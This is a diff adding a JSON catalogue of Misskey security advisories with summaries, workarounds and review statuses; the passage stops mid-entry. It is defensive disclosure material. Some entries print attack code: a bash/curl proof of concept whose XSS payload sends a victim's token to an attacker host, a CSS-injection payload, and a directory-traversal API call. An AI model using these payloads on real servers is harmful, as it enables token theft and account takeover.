@@ -1,0 +1,342 @@
+{
+  "checkedDate": "2026-10-23 (Asia/Tokyo)",
+  "source": "Misskey official published security advisories, pages 1–5; page 6 empty",
+  "advisories": [
+    {
+      "id": "GHSA-2m3r-xx7x-63j6",
+      "title": "Lack of proper permission checks in Direct Messaging",
+      "body": "Summary\n\nAll Misskey servers running versions 2025.3.2 and later, but prior to 2026.5.4, contains a vulnerability that allows bad actors access to limited portions of data around Direct Messages (fka Chat) feature that they normally wouldn't be able to access due to a lack of proper permission checks. This vulnerability occurs regardless of whether federation is enabled or not. Please be aware that the notes created with \"specified\" visibility (fka \"direct\" visibility) are not affected by this vulnerability.\n\nWorkaround\n\nYou can disable direct messages function entirely by utilizing role policy. We've confirmed that role policy can disable this API endpoint effectively.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-2m3r-xx7x-63j6",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-2m5x-5mp6-6vpq",
+      "title": "TOTP tokens can be reused",
+      "body": "Summary\n\nAll Misskey servers running versions prior to 2026.6.0 contain a vulnerability in Time-based One-Time Password (TOTP) authentication where insufficient validation of used tokens allows the reuse of a single-use code within its valid time step. RFC 6238, Section 5.2, states that the verifier MUST NOT accept a second use of an OTP that has already been successfully validated. If both credentials and a TOTP code are obtained concurrently, an attacker may reuse the code to perform unauthorized actions, potentially leading to account takeover.\n\nWorkaround\n\nThere is no known workaround.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-2m5x-5mp6-6vpq",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-2vxv-pv3m-3wvj",
+      "title": "Impersonation and takeover of remote accounts with unnormalized signed activities",
+      "body": "Summary\n\nMisskey doesn't perform proper normalization on the JSON structures of incoming signed ActivityPub activity objects before processing them, allowing threat actors to spoof the contents of signed activities and impersonate the authors of the original activities.\n\nDetails\n\nThe reporter intends to keep this section undisclosed at least for 30 days after the publication of the advisory and until the remedy has been deployed widely.\n\nPoC\n\nThe reporter intends to keep this section undisclosed at least for 30 days after the publication of the advisory and until the remedy has been deployed widely.\n\nImpact\n\nThe vulnerability allows a threat actor to impersonate a target remote account and perform spoofed activities of any type attributed to the target account, provided that the threat actor has access to a valid Linked Data Signature by the target account.\n\nThere are a number of situations where the threat actor can obtain a valid signature by the target account, including:\n\n\nThe target account sends a signed activity to another account and the recipient account's server forwards the activity to a server controlled by the threat actor according to the inbox forwarding mechanism of ActivityPub\n\nThe target account has joined a relay to which a server controlled by the threat actor subscribes, and sends a signed activity to that relay\n\n\nTimeline\n\n\n\n\nDate and time\nEvent\n\n\n\n\n2022-02-03\nThe same kind of vulnerability in Mastodon was disclosed: CVE-2022-24307\n\n\n2024-04-29Z\nPeerTube released v6.1, which fixes the same kind of vulnerability\n\n\n2024-04-29T14:36Z\nIceshrimp released v2023.12.7, which fixes the same vulnerability\n\n\n2024-04-29T18Z\nThis advisory was published\n\n\n2024-04-29Z\nMeisskey released v10.102.699-m544 and v11.37.1-20240430023339, which fix the same vulneravility, and published a security advisory\n\n\n2024-04-29Z\nFirefish released v20240430, which fixes the same vulnerability\n\n\n2024-05-09T20:32:38Z\nSharkey released v2024.3.3, which fixes the same vulnerability",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-2vxv-pv3m-3wvj",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-38jx-423m-g387",
+      "title": "JSON-LD signature validation + compaction is vulnerable to timing attacks",
+      "body": "Summary\n\nAll Misskey servers running versions 12.37.0 and later, but prior to 2026.5.4, is vulnerable to timing attacks in JSON-LD signature validation and compaction process. This will lead to accept fake activities as valid, causing integrity loss.\n\nWorkaround\n\nThere is no known workaround. Please update to the latest Misskey immediately.\n\nNotes\n\n2026.5.4 fixes two vulnerabilities related to JSON-LD, each caused by different reasons. GHSA-w8x2-gpq6-jxvf (CVE-2026-46713) is a vulnerability caused by information being parsed in an unexpected format due to special keys contained in JSON-LD; however, GHSA-38jx-423m-g387 (CVE-2026-47746, this issue) is a vulnerability caused by the fact that the context regarding JSON-LD parsing is not shared between signature verification and actual processing, leading to the trust of information that should not be trusted (a so-called \"TOCTOU\" or \"timing attack\").",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-38jx-423m-g387",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-38w6-vx8g-67pp",
+      "title": "CSRF vulnerability due to insecure configuration of authentication cookie attributes",
+      "body": "Summary\n\nCSRF対策の欠落と、ジョブキューのダッシュボードの認証用のCookieの不適切な設定により、bull-boardの一部のAPIにCSRF攻撃が成立する可能性があります。\n\nDue to a lack of CSRF protection and the lack of proper security attributes in the authentication cookies of Bull's dashboard, some of the APIs of bull-board may be subject to CSRF attacks.\n\nImpact\n\n\nbull-boardのAPIへのCSRF攻撃が可能になる可能性があります\nMay allow CSRF attacks on bull-board APIs\n\n任意のジョブを追加できるなど、可用性や整合性に比較的大きな影響を与える攻撃に使われるリスクがあります\nRisk of being used for attacks with relatively large impact on availability and integrity, such as the ability to add arbitrary jobs\n\n\n\n\n\nWorkarounds\n\nこの脆弱性は2025.2.0で修正されています。Misskeyを2025.2.0以降にアップデートすることを推奨します。\nThis vulneability was fixed in 2025.2.0; upgrading Misskey to 2025.2.0 or later is strongly recommended.\n\n\n/queue下へのアクセスをWAF等で全て遮断する\nBlock all access to the /queue directory with WAF",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-38w6-vx8g-67pp",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-3f39-6537-3cgc",
+      "title": "Misskey&#39;s missing signature validation allows arbitrary users to impersonate any remote user.",
+      "body": "Authors\n\n@yunochi*, @perillamint*\n\nSummary\n\nMisskey's missing signature validation allows arbitrary users to impersonate any remote user.\n\nDetails\n\nWhen Misskey has to verify the remote actor is eligible to POST into\nthe inbox, it only validates its HTTP message signature.\n\nDue to lack of the header validation such as Digest and Host, it allows\nattackers can spoof arbitrary users using ActivityPub server-to-server federation\nprotocol.\n\nSeverity\n\nCVSS v4.0 score: 7.1 (High)\n\nVector String: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:L/VI:H/VA:N/SC:N/SI:N/SA:N\n\nCVSS v3.1 score: 9.3 (Critical)\n\nVector String: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:N\n\nPoC\n\nIncluded in mailed tarball. See /exploit\n\nPossible mitigation\n\nServer administrators\nConfigure the reverse proxy to explicitly filter out the requests with a\nnon-matching HOST header. Since most ActivityPub implementation which\nuses HTTP message signature to authenticate server-to-server federation\nincludes HOST in their signature, it will provide a not-perfect-but-practical\ndefense against this attack.\n\nAlso, use a firewall to block external requests bypassing the reverse\nproxy.\n\nThis vulnerability has been fixed in v2023.11.1; updating to v2023.11.1 or later is strongly recommended.\n\nMisskey maintainers\nThere is a patch that implements missing validation and submitted using the GHSA private fork feature. See branch advisory-fix-1 for the patch.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-3f39-6537-3cgc",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-3p2w-xmv5-jm95",
+      "title": "CSS Style Injection In `MkUrlPreview`",
+      "body": "Summary\n\nDue to an oversight in the validation performed in UrlPreviewService and MkUrlPreview, it is possible for an attacker to inject arbitrary CSS into the MkUrlPreview component.\n\nDetails\n\nUrlPreviewService.wrap falls back to returning the original URL if it's using a protocol that is likely to not be understood by Misskey, IE something other than http or https. This both can deanonymize users and allow further attacks in the client.\nAdditionally, MkUrlPreview doesn't escape CSS when applying a background-image property, allowing an attacker to craft a URL that applies arbitrary styles to the preview element.\n\nPoC\n\n\nHave a webserver host a HTML page with a twitter:image opengraph attribute with the value of ftp://whatever-this-will-be-ignored/');position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:9999;background-color:red;fixup:url('\n\nMake a note linking to said HTML page.\n\nWhen the note is rendered, it will show a big red square covering the entire post area (no mfm required!).\n\n\nImpact\n\nTheoretically, an attacker can craft a CSS injection payload to create a fake error message that can deceive the user into giving away their credentials or similar sensitive information.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-3p2w-xmv5-jm95",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-496g-mmpw-j9x3",
+      "title": "Export data contains private post data",
+      "body": "Summary\n\n閲覧権を持たない非公開の投稿(フォロワー, 指名)をお気に入りまたはクリップに追加後、お気に入りまたはクリップをエクスポートすることで非公開投稿の内容の閲覧が可能となっています。\n\nAfter adding private posts (followers, direct) that you do not have permission to view to your favorites or clips, you can export them to view the contents of the private posts.\n\nPoC\n\n\n検証を行うアカウント(X)と、非公開投稿を行うアカウント(Y)を同じサーバーに作成します\n\nYから「フォロワー」で適当な内容を送信します\n\nYから任意に対して「指名」で適当な内容を送信します\n\nYのアカウントで上記2件の投稿URLを取得します\n\nXで2つの投稿URLを照会、お気に入りもしくはクリップに追加します\n\nXでお気に入りまたはクリップをエクスポートします\n\nエクスポートされたデータを確認します\n\n\nNote: v2025.11.1で確認\n\n\nCreate an account (X) for testing and an account (Y) for private posts on the same server.\n\nSend appropriate content from Y using \"Follow\"\n\nSend appropriate content to any user using \"Nominate\" from Y\n\nObtain the URLs for the two posts above using Y's account.\n\nQuery the URLs for the two posts using X and add them to your favorites or clips.\n\nExport your favorites or clips using X.\n\nCheck the exported data.\n\n\nNote: Verified in v2025.11.1\n\nImpact\n\nこれにより、攻撃者は非公開投稿の内容を閲覧することが可能となります。\nユーザーが非公開の投稿をピン留めしている場合は、オリジナルのサーバーでユーザーページを閲覧すると非公開投稿のIDを取得できるため、現実的な問題が考えられます。\n\nThis could allow an attacker to view the contents of private posts.\nIf you have pinned private posts, this could be a real problem, as the ID of the private post can be obtained by viewing the user page on the original server.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-496g-mmpw-j9x3",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-4x7v-qx8f-g3p8",
+      "title": "Lack of rate limiting and size restrictions in RSS fetching API",
+      "body": "Summary\n\nAll Misskey servers running versions 12.112.1 and later, but prior to 2026.7.0, contain a vulnerability in the RSS Fetching API (fetch-rss) where a lack of rate limiting and size restrictions allows unauthenticated attackers to trigger unbounded outbound HTTP requests and synchronous XML parsing. This can be exploited to cause denial of service (DoS) on the instance, perform request amplification attacks against third-party servers, or probe reachable network services. This vulnerability occurs regardless of whether federation is enabled or not.\n\nWorkaround\n\nOperators can temporarily mitigate this issue by blocking access to the /api/fetch-rss endpoint at the reverse proxy level (e.g., Nginx, Cloudflare). Otherwise, there is no known built-in workaround.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-4x7v-qx8f-g3p8",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-5c3q-jmv3-r6fx",
+      "title": "Lack of proper permission checks",
+      "body": "Summary\n\nAll Misskey servers running versions prior to 2026.9.0 contains a vulnerability that allows bad actors access to limited portions of interaction data around notes whose visibility is restricted, which they normally wouldn't be able to access, due to a lack of proper permission checks. This vulnerability occurs regardless of whether federation is enabled or not.\n\nWorkaround\n\nAdministrators can temporarily mitigate this issue by blocking access to the /api/notes/reactions endpoint at the reverse proxy level (e.g., Nginx, Cloudflare), although this would limit the core functionality of the client. Otherwise, there is no known built-in workaround.\n\n\nThe CVE ID is currently being requested. It will be updated once confirmed.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-5c3q-jmv3-r6fx",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-5h8r-gq97-xv69",
+      "title": "Missing validation allows spoofed poll updates",
+      "body": "Summary\n\nMissing validation in ApInboxService.update allows an attacker to modify the result of polls belonging to another user. No authentication is required, except for a valid signature from any actor on any remote instance.\n\nImpact\n\nVulnerable Misskey instances will accept spoofed updates for remote polls. Local polls are unaffected.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-5h8r-gq97-xv69",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-5q3h-wpfw-hjjw",
+      "title": "Server-Side Request Forgery vulnerability in various APIs",
+      "body": "Summary\n\nSome APIs using HttpRequestService do not properly check the target host.\n\nThis vulnerability allows an attacker to send POST or GET requests to the internal server, which may result in a SSRF attack.\n\nImpact\n\nIt allows an attacker to send POST or GET requests (with some controllable URL parameters) to private IPs, enabling further attacks on internal servers.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-5q3h-wpfw-hjjw",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-675w-hf2m-qwmj",
+      "title": "Missing validation allows spoofed &quot;origin&quot; links",
+      "body": "Summary\n\nMissing validation in NoteCreateService.insertNote, ApPersonService.createPerson, and ApPersonService.updatePerson allows an attacker to control the target of any \"origin\" links (such as the \"view on remote instance\" banner). Any HTTPS URL can be set, even if it belongs to a different domain than the note / user.\n\nImpact\n\nVulnerable Misskey instances will use the unverified URL for several clickable links, allowing an attacker to conduct phishing or other attacks against remote users.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-675w-hf2m-qwmj",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-6qw9-6jxq-xj3p",
+      "title": "XSS vulnerability using app authentication form",
+      "body": "Advisory Author: Acid Chicken (硫酸鶏) root@acid-chicken.com\n\nSummary\n\nA vulnerability in the authorization page for third-party application could allow a remote attacker to hijack user's token.\n\nAffected Versions\n\n>= 10.46.0 < 10.102.4 || >= 11.0.0-alpha.1 < 11.20.2\n\nProof of Concept\n\n\nToken hijacking URL generator (shell script)\nRequires bash, curl, and jq.\n\nDO NOT USE THIS COMMAND IN A PRODUCTION ENVIRONMENT\n\nsufferer='localhost:3000' \\\nattacker='localhost:8080' \\\ncurl -LSs \"https://$sufferer/api/auth/session/generate\" -d\"{\\\"appSecret\\\":$( \\\n  curl -LSs \"https://$sufferer/api/app/create\" \\\n    -d'{\"name\":\"<audio><source onerror=\\\"location.replace(\\\"'\"https://$attacker\"'\\\"+localStorage.getItem(\\\"i\\\"))\\\">\",\"description\":\"\",\"permission\":[]}' \\\n  | jq .secret \\\n)}\" | jq -r .url\n\n\nDetails\n\nTo exploit this vulnerability, the attacker must let target user visit a generated URL.\n\nWorkaround\n\nFor users, don't visit suspicious URL. If you can't decide whether an URL is suspicious, don't access any websites. For server owners, see below.\n\nRemediation\n\nUpgrade Misskey to version 10.102.4 or higher when you are using v10, otherwise upgrade Misskey to version 11.20.2 or higher.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-6qw9-6jxq-xj3p",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-6w2c-vf6f-xf26",
+      "title": "Incomplete Patch on CVE-2024-52591 leading to Forgery of Federated Notes",
+      "body": "Summary\n\nThe patch for CVE-2024-52591 did not sufficiently validate the relation between the id and url fields of ActivityPub objects. An attacker can forge an object where they claim authority in the url field even if the specific ActivityPub object type require authority in the id field.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-6w2c-vf6f-xf26",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-7pxq-6xx9-xpgm",
+      "title": "Improper authorization when accessing with third-party application",
+      "body": "Summary\n\nサードパーティアプリケーションはユーザーの許可なしにkindやsecureが誤って指定されている一部のエンドポイントやWebsocket APIにアクセスし、非公開のコンテンツの読み出しや追加などの操作ができる可能性があります。これによりアプリケーションを認証したユーザーが管理者の場合、オブジェクトストレージのシークレットキーやSMTPサーバーのパスワードなどの機密情報が漏洩し、一般ユーザーに関しても招待コードを無断に作成できたり非公開のユーザー情報が漏洩したりする可能性があります。\n\nSeverity\n\nCVSS v4.0 score: 9.3 (Critical)\nVector String: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:A/VC:H/VI:H/VA:H/SC:H/SI:H/SA:N\n\nCVSS v3.1 score: 9.0 (Critical)\nVector String: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H\n\nPoC\n\nExploit codes are available at GitHub Gist.\n\nTimeline\n\n\n\n\nDate\nEvent\n\n\n\n\n2023-12-01\n@chocolate-pie discovered this vulnerability\n\n\n2023-12-14\nVulnerability report submitted to misskey using github security advisory\n\n\n2023-12-16\nReceived acknowledgement from @syuilo\n\n\n2023-12-18\nFirst patch was committed to misskey-dev/misskey by @syuilo\n\n\n2023-12-27\nCompletely fixed this vulnerability\n\n\n2023-12-29\nSecurity advisory released to public\n\n\n\nReferences\n\n\nhttps://cwe.mitre.org/data/definitions/285.html\n\nhttps://capec.mitre.org/data/definitions/1.html\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html#deny-by-default",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-7pxq-6xx9-xpgm",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-7vgr-p3vc-p4h2",
+      "title": "Missing validation allows spoofed profiles",
+      "body": "Summary\n\nMissing validation in ApRequestService.signedGet allows an attacker to create fake user profiles that appear to be from a different instance than the one where they actually exist. These profiles can be used to impersonate existing users from the target instance.\n\nImpact\n\nVulnerable Misskey instances will accept spoofed users as valid, allowing an attacker to impersonate users on another instance. Attackers have full control of the spoofed user and can post, renote, or otherwise interact like a real account.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-7vgr-p3vc-p4h2",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-9fj2-gjcf-cqqc",
+      "title": "Bypass authentication of Bull dashboard",
+      "body": "Impact\n\nURLを編集することによりジョブキュー管理用UIであるBull dashboardの認証を迂回してアクセスすることができます。\n\nPatches\n\n2023.9.0で修正\n\nWorkarounds\n\nなし",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-9fj2-gjcf-cqqc",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-cc6r-chgr-8r5m",
+      "title": "XSS vulnerability using authentication callback",
+      "body": "Impact\n\nMisskeyのmiauth認証時において、リダイレクト先URLの検証が不十分なため、ユーザーが連携を許可した際に任意のJavaScriptを実行できます。\n13.3.1未満のバージョン全て(12.x含む)で影響を受けます。\n\nDue to insufficient validation of the redirect URL during miauth authentication in Misskey, arbitrary JavaScript can be executed when a user allows the linkage.\nAll versions below 13.3.1 (including 12.x) are affected.\n\nPatches\n\n13.3.1で修正されています。\n\nThis has been fixed in 13.3.1.\n\nWorkarounds\n\n信頼できないアプリの連携を許可しない。\n\nDo not allow authentication of untrusted apps.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-cc6r-chgr-8r5m",
+      "status": "patched-and-regression-tested"
+    },
+    {
+      "id": "GHSA-cgwp-vmr4-wx4q",
+      "title": "SQL injection of notes/search-by-tag",
+      "body": "Impact\n\nタグによるノート検索API(notes/search-by-tag)において、パラメータの検証が不十分なためSQLインジェクションが可能です。\n\nSQL injection is possible due to insufficient parameter validation in the note search API by tag (notes/search-by-tag).\n\nPatches\n\n13.3.3で修正されています。\n\nThis has been fixed in 13.3.3.\n\nWorkarounds\n\napi/notes/search-by-tag へのアクセスを遮断する\n\nBlock access to api/notes/search-by-tag",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-cgwp-vmr4-wx4q",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-cvf3-p7p2-27fh",
+      "title": "Lack of proper authorization checks",
+      "body": "Summary\n\nAll Misskey servers running versions 10.0.0 and later, but prior to 2026.3.1, contains a vulnerability that allows bad actors access to limited portions of data that they normally wouldn't be able to access due to a lack of proper permission checks. This vulnerability occurs regardless of whether federation is enabled or not.\n\nWorkaround\n\nThere is no known workaround for this vunerability.\n\nNotes\n\nWe are intentionally limiting information at this time to protect servers that does not patched yet. We have also fixed another critical vulnerability in 2026.3.1, so please update to the latest version of Misskey immediately.\n\nCVE-2026-28431 consists of the following multiple security advisories. When publishing to the CVE list, it is recommended to use the one with the highest severity score, which is CVSS v4 9.2, as the basis.\n\n\nLack of proper authorization checks and input validation (CVSS v4 9.2)\nGHSA-r33c-qg3g-v9cr\n\nLack of proper authorization checks (CVSS v4 6.9) This advisory\nGHSA-cvf3-p7p2-27fh\n\nLack of proper permission checks (CVSS v4 6.0)\nGHSA-gg7j-c76w-8x3g",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-cvf3-p7p2-27fh",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-g3ph-65m3-x625",
+      "title": "Passkey (WebAuthn) login flow can be disrupted",
+      "body": "Summary\n\nAll Misskey servers running versions 2024.9.0 and later, but prior to 2026.9.0, contains a vulnerability that allows bad actors to disrupt another user's in-progress passkey and security key operations, due to confusion in value storage locations and insufficient validation of values received from clients. The impact is limited to a transient, targeted denial of service against sign-in and security key registration attempts; it does not permanently lock accounts, and it does not allow bad actors to authenticate as another user or to obtain authentication material.\n\nWorkaround\n\nThere is no known workaround. Because the disruption is transient, a user whose passkey or security key operation fails can retry it, although a determined attacker may repeat the interference.\n\n\nThe CVE ID is currently being requested. It will be updated once confirmed.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-g3ph-65m3-x625",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-g6hj-33h7-6fq8",
+      "title": "Lack of resource ownership validation",
+      "body": "Summary\n\nAll Misskey servers running versions 10.93.0 and later, but prior to 2026.3.1, contain a vulnerability that allows importing other users' data due to lack of ownership validation. The impact of this vulnerability is estimated to be relatively low, as bad actors would require the ID corresponding to the target file for import.\n\nWorkaround\n\nIf you are using Misskey version 2024.9.0 or later, you can disable importing function via role policy as workaround.\n\nNotes\n\nWe are intentionally limiting information at this time to protect servers that have not been patched yet. We have also fixed another critical vulnerability in 2026.3.1, so please update to the latest version of Misskey immediately.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-g6hj-33h7-6fq8",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-gg7j-c76w-8x3g",
+      "title": "Lack of proper permission checks",
+      "body": "Summary\n\nAll Misskey servers prior to 2026.3.1 contain a vulnerability where insufficient permission checks allow authenticated bad actors to access to limited portions of data that they normally wouldn't be able to access. This vulnerability occurs regardless of whether federation is enabled or not.\n\nWorkaround\n\nThere is no known workaround for this vulnerability.\n\nNotes\n\nWe are intentionally limiting information at this time to protect servers that have not been patched yet. We have also fixed another critical vulnerability in 2026.3.1, so please update to the latest version of Misskey immediately.\n\nCVE-2026-28431 consists of the following multiple security advisories. When publishing to the CVE list, it is recommended to use the one with the highest severity score, which is CVSS v4 9.2, as the basis.\n\n\nLack of proper authorization checks and input validation (CVSS v4 9.2)\nGHSA-r33c-qg3g-v9cr\n\nLack of proper authorization checks (CVSS v4 6.9)\nGHSA-cvf3-p7p2-27fh\n\nLack of proper permission checks (CVSS v4 6.0) This advisory\nGHSA-gg7j-c76w-8x3g",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-gg7j-c76w-8x3g",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-gmq6-738q-vjp2",
+      "title": "Directory Traversal in AiScript via `Mk:api` ",
+      "body": "Summary\n\nMissing validation in Mk:api allows malicious AiScript code to access additional endpoints that it isn't designed to have access to.\n\nDetails\n\nThe missing validation allows malicious AiScript code to prefix a URL with ../ to step out of the /api directory, thereby being able to make requests to other endpoints, such as /files, /url, and /proxy.\n\nPoC\n\n// This doesn't actually do anything, but it shows that it's making the\n// request with directory traversal if you check devtools\nMk:api('../proxy/avatar.webp?url=https%3A%2F%2Finsertdomain.name%2Fassets%2Ftwemoji%2F72x72%2F1f44b.png&avatar=1', {})\n\nImpact\n\nHard to say how much a malicious actor could do with this, given that they already have access to the other API endpoints, but its better to be safe.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-gmq6-738q-vjp2",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-gq5q-c77c-v236",
+      "title": "Uncontrolled Recursion and Asymmetric Resource Consumption (Amplification) in media/file proxy",
+      "body": "Summary\n\nFileServerService (media proxy) in github.com/misskey-dev/misskey 2024.10.1 or earlier did not detect proxy loops, which allows remote actors to execute a self-propagating reflected/amplified distributed denial-of-service via a maliciously crafted note.\n\nDetails\n\nFileServerService.prototype.proxyHandler did not check incoming requests are not coming from another proxy server.\nAn attacker can execute an amplified denial-of-service by sending a nested proxy request to the server and end the request with a malicious redirect back to another nested proxy request.\nLeading to unbounded recursion until the original request is timed out.\n\n[Detailed exploitation methodology is withheld]\n\nRemediation\n\nUpgrade to Misskey v2024.11.0 or later.\n\nOR\n\nConfigure the reverse proxy to block requests to the proxy with an empty User-Agent header or one containing Misskey/. An attacker can not effectively modify the User-Agent header without making another request to the server.\n\nInstances with external media proxy configured are also affected by this vulnerability. If you have an external media proxy, you should confirm both the internal AND external proxy are not vulnerable.\n\nImpact\n\nAn unsophisticated attack (single IP, single instance) can lead to excessive CPU and gigabytes of memory usage and noticeable performance degradation while staying below the rate-limiting threshold.\n\nA (currently unproven but realistic) well-orchestrated attack can lead to widespread outages across multiple instances.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-gq5q-c77c-v236",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-grwc-c762-gcvp",
+      "title": "HTTP signature verification can be bypassed",
+      "body": "Summary\n\nAll Misskey servers prior to 2026.3.1 contain a vulnerability that allows bypassing HTTP signature verification. Although this is a vulnerability related to federation, it affects all servers regardless of whether federation is enabled or disabled.\n\nWorkaround\n\nThere is no known workaround for this vulnerability.\n\nNotes\n\nWe are intentionally limiting information at this time to protect servers that have not been patched yet. We have also fixed another critical vulnerability in 2026.3.1, so please update to the latest version of Misskey immediately.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-grwc-c762-gcvp",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-h3mq-w9gq-6mwm",
+      "title": "Insufficient validation in custom emoji ZIP import leads to arbitrary file read",
+      "body": "Summary\n\nAll Misskey servers running versions 2026.5.2 and later, but prior to 2026.9.0, contains a vulnerability that allows bad actors to obtain the contents of files on the server host that they normally wouldn't be able to access, due to insufficient validation of the entries contained in an archive supplied to the custom emoji import feature. The obtained content may then be retrievable without authentication. Exploitation does not require an account on the affected server: it is sufficient for a poisoned emoji pack to be imported by someone who is permitted to manage custom emoji.\n\nThe underlying library slacc, which is an library intended to be used internally for Misskey, is affected in versions 0.1.0 and later. There will be no fixed version will be released, as the affected functionality is going to remove entrirely from the library.\n\nWorkaround\n\nThere is no configuration or role policy that fully prevents this, as the import may be performed by an administrator. Until you are able to update, do not import custom emoji archives obtained from sources you do not fully trust.\n\nIf you are using slacc directly in your product (though such usage is not recommended given the nature of this library regardless), please avoid using slacc to extract ZIP files and migrate to a different library as soon as possible.\n\n\nThe CVE ID is currently being requested. It will be updated once confirmed.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-h3mq-w9gq-6mwm",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-j49q-76hx-mv8f",
+      "title": "Improper authorization in announcements API",
+      "body": "Summary\n\nAll Misskey servers running versions 2024.5.0 and later, but prior to 2026.5.4, contain a vulnerability in Server Announcements API where insufficient permission checks allow bad actors to access to limited portions of data that they normally wouldn't be able to access. This vulnerability occurs regardless of whether federation is enabled or not.\n\nWorkaround\n\nThere is no known workaround.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-j49q-76hx-mv8f",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-jvcx-f39m-5xrj",
+      "title": "SSRF bypass in URL Preview",
+      "body": "Summary\n\nAll Misskey servers running versions prior to 2026.6.0 contain a Server-Side Request Forgery (SSRF) vulnerability in the URL preview functionality. Due to missing network restrictions before establishing outbound connections, a remote attacker can cause the Misskey server to initiate HTTP requests to loopback, private, or link-local services.\n\nPlease note that because the IP address validation takes place after the request has been sent and the process is subsequently rejected, it is believed that no sensitive internal data that should not be visible to the client side is actually transmitted back or exposed to the attacker.\n\nWorkaround\n\nThere is no known workaround.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-jvcx-f39m-5xrj",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-jx9q-24fh-4fxw",
+      "title": "Path traversal in custom emoji ZIP import leads to arbitrary file write",
+      "body": "Summary\n\nAll Misskey servers running versions 12.102.0 and later, but prior to 2026.9.0, is vulnerable to path traversal in the custom emoji bulk import. Bad actors holding a role with the custom emoji management policy can cause files to be written outside the intended directory, which may lead to remote code execution depending on the server configuration. The role is not granted by default, but an administrator can assign to non-privileged users.\n\nThe underlying library slacc, which is an library intended to be used internally for Misskey, is affected in versions 0.0.2 and later. There will be no fixed version will be released, as the affected functionality is going to remove entrirely from the library.\n\nWorkaround\n\nReview your role policies and revoke the custom emoji management permission from any role assigned to users you do not fully trust. This reduces exposure but is not a complete mitigation, so please update to the latest Misskey.\n\nIf you are using slacc directly in your product (though such usage is not recommended given the nature of this library regardless), please avoid using slacc to extract ZIP files and migrate to a different library as soon as possible.\n\n\nThe CVE ID is currently being requested. It will be updated once confirmed.",
+      "url": "https://github.com/misskey-dev/misskey/security/advisories/GHSA-jx9q-24fh-4fxw",
+      "status": "requires-source-review"
+    },
+    {
+      "id": "GHSA-m2gq-69fp-6hv4",
+      "title": "Missing validation allows spoofed profiles and notes",
